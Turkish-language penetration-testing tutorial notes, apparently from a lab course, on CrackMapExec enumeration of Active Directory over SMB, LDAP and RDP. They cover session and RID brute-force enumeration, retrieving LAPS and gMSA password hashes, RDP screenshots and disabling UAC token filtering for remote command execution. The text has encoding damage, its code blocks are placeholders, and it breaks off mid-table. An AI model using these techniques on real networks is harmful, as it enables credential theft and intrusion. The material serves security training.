CrackMapExec, geÃ§erli bir domain kullanÄ±cÄ± hesabÄ±yla numaralandÄ±rma sÃ¶z konusu olduÄŸunda Ã§ok daha fazla seÃ§enekle birlikte gelir. En Ã§ok kullanÄ±lan seÃ§enekleri ele aldÄ±k, ancak daha derine inelim. Ä°ÅŸte ayrÄ±calÄ±klÄ± olmasa bile geÃ§erli bir hesap aldÄ±ÄŸÄ±mÄ±zda kullanabileceÄŸimiz tÃ¼m seÃ§eneklerin listesi:

| Komut                                                                 | AÃ§Ä±klama                                                          |
| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --loggedon-users` | Hedefte oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± listeler.                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --sessions`       | Hedefteki aktif oturumlarÄ± listeler.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --disks`          | Hedefteki diskleri listeler.                                      |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --computers`      | Hedef aÄŸdaki bilgisayarlarÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi`            | Belirtilen WMI sorgusunu Ã§alÄ±ÅŸtÄ±rÄ±r.                              |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --wmi-namespace`  | WMI Namespaceâ€™ini belirtir (varsayÄ±lan: `root\cimv2`).            |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --rid-brute`      | Hedef Ã¼zerinde RID brute-force yÃ¶ntemiyle kullanÄ±cÄ±larÄ± listeler. |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --local-groups`   | Local gruplarÄ± listeler; grup belirtilirse Ã¼yelerini listeler.    |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --shares`         | Hedefteki tÃ¼m paylaÅŸÄ±m izinlerini listeler.                       |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`          | Hedefteki domain kullanÄ±cÄ±larÄ±nÄ± listeler.                        |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`         | Hedefteki domain gruplarÄ±nÄ± listeler.                             |
| `crackmapexec smb <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --pass-pol`       | Domainin password policy'sini gÃ¶sterir.                           |

Daha Ã¶nce Ã§alÄ±ÅŸmamÄ±ÅŸ olanlarÄ± gÃ¶zden geÃ§irelim:

### Hedefteki aktif oturumlarÄ± / oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ± numaralandÄ±rma

Birden fazla hedefi ele geÃ§irmiÅŸsek, aktif oturumlarÄ± kontrol etmek faydalÄ± olabilir, belki bir domain administrator vardÄ±r ve bu belirli hedefe odaklanmamÄ±z gerekebilir. Bir bilgisayardaki kullanÄ±cÄ±larÄ± tespit etmek iÃ§in `--sessions` ve `--loggedon-users` seÃ§eneklerini kullanabiliriz. Session'lar, kullanÄ±cÄ±nÄ±n hedef makinede giriÅŸ yapmÄ±yor olsa da kullanÄ±cÄ± kimlik bilgileriyle oturum aÃ§Ä±ldÄ±ÄŸÄ± anlamÄ±na gelir. GiriÅŸ yapmÄ±ÅŸ kullanÄ±cÄ±lar ise kendiliÄŸinden anlaÅŸÄ±lÄ±r; bir kullanÄ±cÄ±nÄ±n hedef makineye giriÅŸ yapmÄ±ÅŸ olduÄŸunu ifade eder. `BloodHound`, aktif oturumlarÄ± bulmak iÃ§in kullanabileceÄŸimiz bir diÄŸer araÃ§tÄ±r.


### Sessions ve loggendon-users seÃ§eneklerini kullanma

{{CODE_BLOCK_126}}

Belirli bir kullanÄ±cÄ±yÄ± arÄ±yorsak, -`-loggedon-users-filter` seÃ§eneÄŸini ve ardÄ±ndan aradÄ±ÄŸÄ±mÄ±z kullanÄ±cÄ±nÄ±n adÄ±nÄ± kullanabiliriz. Birden fazla kullanÄ±cÄ± arÄ±yorsak, `regex`'i de destekler.


### Oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larla filtre seÃ§eneÄŸini kullanma

{{CODE_BLOCK_127}}

Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin baÅŸarÄ±lÄ± bir ÅŸekilde Ã§alÄ±ÅŸtÄ±rÄ±labilmesi iÃ§in administrator izinleri gereklidir.



### Enumerate Computers

CME ayrÄ±ca domain bilgisayarlarÄ±nÄ± da listeleyebilir ve bunu bir LDAP isteÄŸi gerÃ§ekleÅŸtirerek yapar

### Domain'deki BilgisayarlarÄ± NumaralandÄ±rma

{{CODE_BLOCK_128}}


Not: Bu seÃ§enek yalnÄ±zca SMB protokolÃ¼nde mevcut olsa da, CME bir LDAP sorgusu yapmaktadÄ±r.


### Enumerate LAPS

Local Administrator Password Solution (LAPS), domain'e baÄŸlÄ± bilgisayarlarÄ±n local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca uygun kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya sÄ±fÄ±rlama talebinde bulunabilir. LAPS domain iÃ§inde kullanÄ±lÄ±yorsa ve LAPS ÅŸifrelerini okuyabilen bir hesabÄ± tehlikeye atarsak, `--laps` seÃ§eneÄŸini bir hedef listesi ile kullanabilir ve komutlarÄ± Ã§alÄ±ÅŸtÄ±rabilir veya `--sam` gibi diÄŸer seÃ§enekleri kullanabiliriz.


{{CODE_BLOCK_129}}

Not: EÄŸer varsayÄ±lan administrator hesap adÄ± "`administrator`" deÄŸilse, -`-laps username` seÃ§eneÄŸinden sonra kullanÄ±cÄ± adÄ±nÄ± ekleyin.

### Hedefteki RID'yi Brute-forcing yaparak KullanÄ±cÄ±larÄ± NumaralandÄ±r --rid-brute

Nadiren kullanÄ±lan bir Ã¶zellik, kullanÄ±cÄ± listeleri oluÅŸturmak iÃ§in `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanÄ±cÄ± listesi oluÅŸturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktÄ±r. CrackMapExec'in `--rid-brute` seÃ§eneÄŸini kullanarak, UserID'sini brute forcing yaparak bir kullanÄ±cÄ± listesi toplamak mÃ¼mkÃ¼ndÃ¼r.


### List Local Users

{{CODE_BLOCK_130}}

VarsayÄ±lan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandÄ±rÄ±r. DavranÄ±ÅŸÄ±nÄ± `--rid-brute [MAX_RID]` kullanarak deÄŸiÅŸtirebiliriz.

`--rid-brute` seÃ§eneÄŸi, brute ile zorlanan kimliklerle eÅŸleÅŸen kullanÄ±cÄ± adlarÄ±nÄ± ve diÄŸer Active Directory objeleri almak iÃ§in kullanÄ±labilir. `NULL Authentication` etkinleÅŸtirilmiÅŸse domain hesaplarÄ±nÄ± numaralandÄ±rmak iÃ§in de kullanÄ±labilir. Bu seÃ§eneÄŸin bu ÅŸekillerde kullanÄ±labileceÄŸini unutmamak Ã¶nemlidir.

### Enumerate Disks

Bazen kontrol etmeyi hatÄ±rlamamÄ±z gereken Ã¶nemli bir parÃ§a, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi saÄŸlayan bir `--disks` seÃ§eneÄŸine sahiptir.

### Enumerating Disks

{{CODE_BLOCK_131}}


### Local ve Domain GruplarÄ±nÄ± NumaralandÄ±rma

Local-groups ile local gruplarÄ± veya `--groups` ile domain gruplarÄ±nÄ± listeleyebiliriz.

### Enumerating Local Groups

{{CODE_BLOCK_132}}

### Enumerating Domain Groups

{{CODE_BLOCK_133}}


EÄŸer grup Ã¼yelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.


### Group **Members**

{{CODE_BLOCK_134}}

Not: YazÄ±m sÄ±rasÄ±nda `--local-group` yalnÄ±zca bir Domain Controller'a karÅŸÄ± Ã§alÄ±ÅŸÄ±r ve grup adÄ±nÄ± kullanarak bir grubu sorgulamak iÅŸe yaramaz.


### WMI Sorgulama

[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows iÅŸletim sistemlerinde administrative iÅŸlemler iÃ§in kullanÄ±lÄ±r. Remote bilgisayarlardaki administrative gÃ¶revlerini otomatikleÅŸtirmek iÃ§in WMI script dosyalarÄ± veya uygulamalarÄ± yazabiliriz. WMI, iÅŸletim sisteminin diÄŸer bÃ¶lÃ¼mlerine ve System Center Operations Manager (eski adÄ±yla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi Ã¼rÃ¼nlere yÃ¶netim verileri saÄŸlar.

Windows Management Instrumentation'nÄ±n (WMI) birincil kullanÄ±m alanlarÄ±ndan biri, sÄ±nÄ±f (class) ve Ã¶rnek (instance) bilgileri iÃ§in WMI havuzunu sorgulama yeteneÄŸidir. Ã–rneÄŸin, WMI'dan remote veya local bir sistemden shut-down olaylarÄ±nÄ± temsil eden tÃ¼m objeleri dÃ¶ndÃ¼rmesini isteyebiliriz.

WMI, TCP port `135` ve bir dizi dinamik port kullanÄ±r: `49152-65535 (RPC dinamik portlarÄ± - Windows Vista, 2008 ve Ã¼zeri)`, TCP 1024-65535 (RPC dinamik portlarÄ± - Windows NT4, Windows 2000, Windows 2003) veya WMI'yÄ± Ã¶zel bir port aralÄ±ÄŸÄ± kullanacak ÅŸekilde ayarlayabiliriz

Ã–rneÄŸin, remote bir bilgisayarda `Sysmon` uygulamasÄ±nÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± sorgulamak ve `Caption` ve `ProcessId`'yi gÃ¶rÃ¼ntÃ¼lemek iÃ§in WMI kullanalÄ±m, kullanacaÄŸÄ±mÄ±z WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` ÅŸeklindedir:


### Sysmon'un Ã‡alÄ±ÅŸÄ±p Ã‡alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± Sorgulamak iÃ§in WMI Kullanma

{{CODE_BLOCK_135}}

WMI, sÄ±nÄ±flarÄ±nÄ± hiyerarÅŸik bir namespace iÃ§inde dÃ¼zenler. Bir sorgu gerÃ§ekleÅŸtirmek iÃ§in, Class Name ve bulunduÄŸu Namespace'i bilmemiz gerekir. YukarÄ±daki Ã¶rnekte, `Win32_Process` sÄ±nÄ±fÄ±nÄ± `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik Ã§Ã¼nkÃ¼ varsayÄ±lan olarak CME, `root\cimv2`'yi kullanÄ±r (bu bilgiyi --help menÃ¼sÃ¼nde gÃ¶rebiliriz).

BaÅŸka bir namespace'i sorgulamak iÃ§in onu belirtmemiz gerekir. Ã–rneÄŸin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sÄ±nÄ±fÄ±nÄ± sorgulayalÄ±m. Bu sÄ±nÄ±f, sistem Ã§alÄ±ÅŸÄ±rken dinamik olarak aÃ§Ä±lÄ±p kapanmasÄ± gereken cihazlar hakkÄ±nda bilgi tutar. Belirli bir konuyla ilgili WMI sÄ±nÄ±flarÄ±nÄ±n nasÄ±l bulunacaÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.


### Quering root\WMI Namespace

{{CODE_BLOCK_136}}

Not: Genellikle, WMI'yÄ± sorgulamak iÃ§in administrative ayrÄ±calÄ±klarÄ±na sahip olmamÄ±z gerekir, ancak bir administrator, WMI'yÄ± sorgulamak iÃ§in administrator olmayan bir hesabÄ± yapÄ±landÄ±rabilir. Bu durumda, WMI sorgularÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in administrator olmayan bir hesap kullanabiliriz.

WMI Sorgu Dili (WQL) hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.



AÅŸaÄŸÄ±daki bÃ¶lÃ¼m LDAP ve RDP protokollerini kullanarak numaralandÄ±rmayÄ± kapsayacaktÄ±r.

----


### LDAP and RDP Enumeration

Daha Ã¶nce, CrackMapExec'te en Ã§ok kullanÄ±lan protokol olan `SMB` ile bazÄ± numaralandÄ±rma seÃ§eneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandÄ±rma seÃ§eneÄŸi vardÄ±r

Bu bÃ¶lÃ¼mde, bu seÃ§eneklerden bazÄ±larÄ± ve hedeflerimizi nasÄ±l daha fazla numaralandÄ±rabileceÄŸimiz gÃ¶sterilecektir

### LDAP & RDP Commands

LDAP ve RDP protokolleri aÅŸaÄŸÄ±daki seÃ§enekleri iÃ§erir:

| Komut                                                                          | AÃ§Ä±klama                                                                                           |
| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --users`                  | Etkin Domain kullanÄ±cÄ±larÄ±nÄ± listeler.                                                             |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --groups`                 | Domain gruplarÄ±nÄ± listeler.                                                                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayraÄŸÄ± olan kullanÄ±cÄ±larÄ± listeler.                                            |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± olan kullanÄ±cÄ± ve bilgisyalarÄ±nÄ± listeler.                        |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --get-sid`                | Domainin SID bilgisini alÄ±r.                                                                       |
| `crackmapexec ldap <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --gmsa`                   | GMSA (GruplandÄ±rÄ±lmÄ±ÅŸ YÃ¶netici Hizmet HesaplarÄ±) ÅŸifrelerini listeler.                             |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --nla-screenshot`          | NLA (AÄŸ Seviyesinde Kimlik DoÄŸrulamasÄ±) devre dÄ±ÅŸÄ± ise RDP giriÅŸ ekranÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r. |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screenshot`              | BaÄŸlantÄ± baÅŸarÄ±lÄ±ysa RDP oturumunun ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ alÄ±r.                                        |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --screentime`              | MasaÃ¼stÃ¼ gÃ¶rÃ¼ntÃ¼sÃ¼ iÃ§in bekleme sÃ¼resini belirtir.                                                 |
| `crackmapexec rdp <hedef> -u <kullanÄ±cÄ±> -p <ÅŸifre> --res RES`                 | Ã‡Ã¶zÃ¼nÃ¼rlÃ¼k belirler (Ã¶rnek format: WIDTHxHEIGHT, varsayÄ±lan: 1024x768).                            |

HenÃ¼z Ã§alÄ±ÅŸmadÄ±klarÄ±mÄ±z varsa onlarÄ± gÃ¶zden geÃ§irelim.

### Enumerating Users and Groups

SMB protokolÃ¼nde yaptÄ±ÄŸÄ±mÄ±z gibi, `LDAP` ile de kullanÄ±cÄ±larÄ± ve gruplarÄ± listeleyebiliriz:

### Enumerating Users and Groups

{{CODE_BLOCK_137}}

Not: Domain FQDN'sini Ã§Ã¶zÃ¼mleyemezsek LDAP protokol iletiÅŸimlerinin Ã§alÄ±ÅŸmayacaÄŸÄ±nÄ± unutmayÄ±n. Domain DNS sunucularÄ±na baÄŸlanmÄ±yorsak, FQDN'yi `/etc/hosts` dosyasÄ±nda yapÄ±landÄ±rmamÄ±z gerekir


### Ä°lginÃ§ Hesap Ã–zelliklerini NumaralandÄ±rma

`ldap` protokolÃ¼, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayraÄŸÄ± ile hesaplarÄ± tanÄ±mlamamÄ±za yardÄ±mcÄ± olacak birkaÃ§ seÃ§eneÄŸe daha sahiptir ve hatta `adminCount` deÄŸeri `1` olan tÃ¼m hesaplarÄ± sorgulayabiliriz.

`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmÄ±ÅŸsa, kullanÄ±cÄ± geÃ§erli password policy uzunluÄŸuna tabi deÄŸildir, yani daha kÄ±sa bir parolaya sahip olabilir veya hiÃ§ parola kullanmayabilir (domain'de boÅŸ parolalara izin veriliyorsa). Bu hesaplarÄ± tanÄ±mlamak iÃ§in  `--password-notrequired` seÃ§eneÄŸini kullanabiliriz.


### PASSWD_NOTREQD Attribute TanÄ±mlanmasÄ±

{{CODE_BLOCK_138}}

`TRUSTED_FOR_DELEGATION` attribute ayarlanÄ±rsa, bir servisin altÄ±nda Ã§alÄ±ÅŸtÄ±ÄŸÄ± servis hesabÄ± (kullanÄ±cÄ± veya bilgisayar) Kerberos yetkilendirmesi iÃ§in gÃ¼venilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldÄ±rÄ± tÃ¼rÃ¼ne `Kerberos Unconstrained Delegation` adÄ± verilir. Bu konu hakkÄ±nda daha fazla bilgi edinmek iÃ§in bu [blog](https://adsecurity.org/?p=1667) yazÄ±sÄ±nÄ± okuyabilirsiniz.

### Unconstrained Delegation Belirlenmesi

{{CODE_BLOCK_139}}

`AdminCount` attribute, SDProp process'in bir kullanÄ±cÄ±yÄ± koruyup korumadÄ±ÄŸÄ±nÄ± belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar iÃ§in ACL permissions'Ä±n bir template'i olarak gÃ¶rev yapar. EÄŸer herhangi bir account ACE'si (Ã¶rneÄŸin, bir attacker tarafÄ±ndan) modified edilirse, bu process tarafÄ±ndan korunan account'larÄ±n ACL permissions'Ä±, `SDProp` process her Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda (default olarak her 60 dakikada bir Ã§alÄ±ÅŸÄ±r, ancak bu sÃ¼re modified edilebilir) templated permission set'e resetlenir. User, adminCount deÄŸeri 0 olarak set edilmiÅŸse veya specified deÄŸilse bu koruma kapsamÄ±na girmez. EÄŸer attribute value 1 olarak set edilmiÅŸse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'larÄ± target olarak arar. Bunlar genellikle privileged account'lardÄ±r ve further access veya full domain compromise ile sonuÃ§lanabilir.


### adminCount Attribute'u Sorgulama

{{CODE_BLOCK_140}}


### Domain SID'sini numaralandÄ±rma

BazÄ± domain attack'larÄ±, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'Ä±n sizi tanÄ±mlamak iÃ§in kullandÄ±ÄŸÄ± `unique bir ID` numarasÄ±dÄ±r. Domain SID ise domain'i tanÄ±mlayan unique bir ID numarasÄ±dÄ±r. CrackMapExec kullanarak domain SID'i elde etmek iÃ§in `--get-sid` flag'ini kullanabiliriz:

### Domain SID'i Toplama

{{CODE_BLOCK_141}}


### Group Managed Service Accounts (gMSA)

BaÄŸÄ±msÄ±z YÃ¶netilen Hizmet HesabÄ± (standalone Managed Service Account) (sMSA), aÅŸaÄŸÄ±dakileri saÄŸlayan yÃ¶netilen bir domain hesabÄ±dÄ±r:

* Otomatik parola yÃ¶netimi.
* BasitleÅŸtirilmiÅŸ service principal name (SPN) yÃ¶netimi.
* YÃ¶netimi diÄŸer yÃ¶neticilere devretme yeteneÄŸi

Bu yÃ¶netilen servis hesabÄ± (MSA) tÃ¼rÃ¼ Windows Server 2008 R2 ve Windows 7'de tanÄ±tÄ±lmÄ±ÅŸtÄ±r.

Group Managed Service Account (gMSA) domain iÃ§inde aynÄ± iÅŸlevselliÄŸi saÄŸlar ancak aynÄ± zamanda bu iÅŸlevselliÄŸi birden fazla sunucuya geniÅŸletir.

Bir gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuma ayrÄ±calÄ±klarÄ±na sahip bir hesabÄ± belirlemek iÃ§in PowerShell'i kullanabiliriz (komut yÃ¼rÃ¼tmeyi bir sonraki bÃ¶lÃ¼mde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z):

### Enumerating Accounts with gMSA Privileges

{{CODE_BLOCK_142}}


YukarÄ±daki Ã¶rnekte, `engels` kullanÄ±cÄ±sÄ±nÄ±n `PrincipalsAllowedToRetrieveManagedPassword` ayrÄ±calÄ±ÄŸÄ±na sahip olduÄŸunu gÃ¶rebiliriz, bu da `svc_inlaneadm$` gMSA hesabÄ±nÄ±n parolasÄ±nÄ± okuyabileceÄŸi anlamÄ±na gelir. gMSA parolasÄ±nÄ± okuma hakkÄ±na sahip bir hesabÄ± tehlikeye atarsak, hesabÄ±n `NTLM` parola hash'ini almak iÃ§in `--gmsa` seÃ§eneÄŸini kullanabiliriz.


### gMSA ParolasÄ±nÄ± Edinme

{{CODE_BLOCK_143}}

Bu kimlik bilgilerini kullanmak iÃ§in, hash'ler iÃ§in -H seÃ§eneÄŸini kullanabiliriz.

### svc_inlaneadm$ HesabÄ± ile PaylaÅŸÄ±lan KlasÃ¶rleri Ä°nceleme

{{CODE_BLOCK_144}}


---

### RDP Screenshots

RDP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla kullanÄ±cÄ± adlarÄ±nÄ± numaralandÄ±rmak iÃ§in CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnÄ±zca `NLA` ile izin verme seÃ§eneÄŸi devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸsa, oturum aÃ§ma isteminin ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ almak iÃ§in `--nlascreenshot` seÃ§eneÄŸini kullanabiliriz


### Enumerate Login Prompt

{{CODE_BLOCK_145}}

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz.


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in Eye Kullanma

{{CODE_BLOCK_146}}

![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)

EÄŸer bir kullanÄ±cÄ± adÄ± ve parolamÄ±z varsa, `--screenshot` seÃ§eneÄŸi ile RDP protokolÃ¼nÃ¼ kullanarak da ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alabiliriz. Bu seÃ§enek `--screentime` ile birleÅŸtirilebilir, varsayÄ±lan olarak `10`, RDP baÄŸlantÄ±sÄ± aÃ§Ä±ldÄ±ktan sonra ekran gÃ¶rÃ¼ntÃ¼sÃ¼ almak iÃ§in bekleyeceÄŸi sÃ¼redir. Bu, bir hedef makineye baÄŸlandÄ±ÄŸÄ±mÄ±zda ve hedefin masaÃ¼stÃ¼nÃ¼ yÃ¼klemesi 10 saniyeden fazla sÃ¼rdÃ¼ÄŸÃ¼nde kullanÄ±ÅŸlÄ±dÄ±r.

Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ seÃ§eneÄŸiyle birleÅŸtirilebilecek bir diÄŸer seÃ§enek de RDP baÄŸlantÄ±sÄ± sÄ±rasÄ±ndaki ekran Ã§Ã¶zÃ¼nÃ¼rlÃ¼ÄŸÃ¼ne karÅŸÄ±lÄ±k gelen `--res` seÃ§eneÄŸidir. Bu seÃ§enek yararlÄ±dÄ±r Ã§Ã¼nkÃ¼ aktif bir RDP oturumu bulursak, kullanÄ±cÄ±nÄ±n ekranÄ±nÄ±n boyutuna baÄŸlÄ± olarak tÃ¼m iÃ§eriÄŸi gÃ¶rebiliriz veya gÃ¶remeyiz. VarsayÄ±lan olarak bu seÃ§enek `1024x768` olarak ayarlanmÄ±ÅŸtÄ±r


### Screenshot Alma

{{CODE_BLOCK_147}}


Not: `--screentime` ve `--res` isteÄŸe baÄŸlÄ± bayraklardÄ±r.

Son olarak, ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ aÃ§mak iÃ§in MATE'in Eye'Ä±nÄ± veya CLI'dan eom'u kullanabiliriz:


### Ekran GÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼ AÃ§mak iÃ§in MATE'in GÃ¶zÃ¼nÃ¼ Kullanma

{{CODE_BLOCK_148}}

![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)

Bu bÃ¶lÃ¼mde, hedeflerimize ulaÅŸmamÄ±za yardÄ±mcÄ± olabilecek LDAP ve RDP kullanarak Ã§eÅŸitli numaralandÄ±rma seÃ§eneklerini inceledik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼m, CrackMapExec kullanarak komutlarÄ±n nasÄ±l Ã§alÄ±ÅŸtÄ±rÄ±lacaÄŸÄ±nÄ± gÃ¶zden geÃ§irecektir.


---

### Command Execution

Remote target Ã¼zerinde local administrator olarak bir komut Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸmadan Ã¶nce `UAC`'nin varlÄ±ÄŸÄ±nÄ± kontrol etmeliyiz. UAC etkinleÅŸtirildiÄŸinde, ki bu varsayÄ±lan durumdur, yalnÄ±zca `RID 500`'e sahip administrator hesabÄ± (varsayÄ±lan administrator) remote komutlarÄ± yÃ¼rÃ¼tebilir. Durumun bÃ¶yle olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in iki registry key vardÄ±r:

`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`

VarsayÄ±lan olarak, `LocalAccountTokenFilterPolicy` deÄŸeri 0 olarak ayarlanmÄ±ÅŸtÄ±r, yani yalnÄ±zca built-in administrator hesabÄ± (RID 500) administration gÃ¶revlerini gerÃ§ekleÅŸtirebilir. Local administrator grubunda olsak bile, yalnÄ±zca kullanÄ±cÄ±mÄ±zÄ±n RID'si `500` ise remote komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. DeÄŸer 1 olarak ayarlanÄ±rsa tÃ¼m administrative hesaplarÄ± yÃ¶netim gÃ¶revlerini yÃ¼rÃ¼tebilir.

Administrator yapÄ±landÄ±rabileceÄŸi bir diÄŸer ayar da local administrator hesabÄ±nÄ±n (RID 500) remote yÃ¶netim gÃ¶revlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry deÄŸerini 1 olarak ayarlayarak yapÄ±labilir; bu, built-in administrator hesabÄ±nÄ±n (RID 500) remote administrative tasks (remote yÃ¶netim gÃ¶revleri) gerÃ§ekleÅŸtiremeyeceÄŸi anlamÄ±na gelir.


### Administrator Olarak Komut YÃ¼rÃ¼tme

KomutlarÄ± Ã§alÄ±ÅŸtÄ±rmak ve administrators grubuna kimlerin Ã¼ye olduÄŸunu gÃ¶rmek iÃ§in Administrator hesabÄ±nÄ± kullanalÄ±m. Windows komut satÄ±rÄ± komutlarÄ±nÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in `-x` seÃ§eneÄŸini ve ardÄ±ndan Ã§alÄ±ÅŸtÄ±rmak istediÄŸimiz komutu kullanmamÄ±z gerekir.


### Bir Komutu Administrator Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_149}}


### RID 500 Olmayan Hesap Olarak Komut YÃ¼rÃ¼tme

YukarÄ±daki komutta, `localadmin` local user `Administrators` grubundadÄ±r, ancak remote komutu Ã§alÄ±ÅŸtÄ±ramaz:

### Komutu localadmin olarak Ã§alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_150}}

Bu, UAC'nin etkin olduÄŸu anlamÄ±na gelir. EÄŸer durum bÃ¶yleyse, hesap administrator olsa bile (Pwn3d!) mesajÄ±nÄ± almayacaÄŸÄ±z. Bu ayarÄ± geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.


### LocalAccountTokenFilterPolicy'yi DeÄŸiÅŸtirme

{{CODE_BLOCK_151}}


{{CODE_BLOCK_152}}


### Domain HesabÄ± Olarak Komut YÃ¼rÃ¼tme

`LocalAccountTokenFilterPolicy` yalnÄ±zca local hesaplar iÃ§in geÃ§erlidir. Bir domain kullanÄ±cÄ±mÄ±z varsa ve `administrators` grubunun bir parÃ§asÄ±ysa, UAC ayarÄ±yla bile komutu Ã§alÄ±ÅŸtÄ±rabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabÄ± `administrators` `grubunun` bir Ã¼yesidir, yani UAC etkin olsa bile komutlarÄ± yÃ¼rÃ¼tebilir.


### Komutu Robert olarak Ã§alÄ±ÅŸtÄ±r

{{CODE_BLOCK_153}}


### SMB ile Komut YÃ¼rÃ¼tme

CME'nin dÃ¶rt (4) farklÄ± komut yÃ¼rÃ¼tme yÃ¶ntemi vardÄ±r:

| Komut   | AÃ§Ä±klama                                                                                                                             |
